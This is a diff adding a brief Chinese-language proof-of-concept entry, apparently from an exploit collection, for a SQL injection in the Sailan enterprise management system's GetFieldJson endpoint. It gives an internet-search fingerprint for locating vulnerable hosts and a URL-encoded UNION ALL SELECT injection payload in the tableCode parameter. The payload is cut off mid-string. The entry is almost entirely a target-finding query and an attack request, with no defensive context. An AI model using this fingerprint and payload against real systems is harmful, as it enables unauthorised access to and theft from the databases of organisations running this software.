@@ -1,0 +1,6 @@
+# 赛蓝企业管理系统GetFieldJson存在SQL注入漏洞
+
+- **系统**：赛蓝企业管理系统　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`body="www.cailsoft.com"`
+- **请求**：`http://ip/BaseModule/ExcelImport/GetFieldJson?tableCode=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2881%29%2BCHAR%28119%29%2BCHAR%2888%29%2BCHAR%2899%29%2BCHAR%2865%29%2BCHA`
+- **预期**：200　|　—
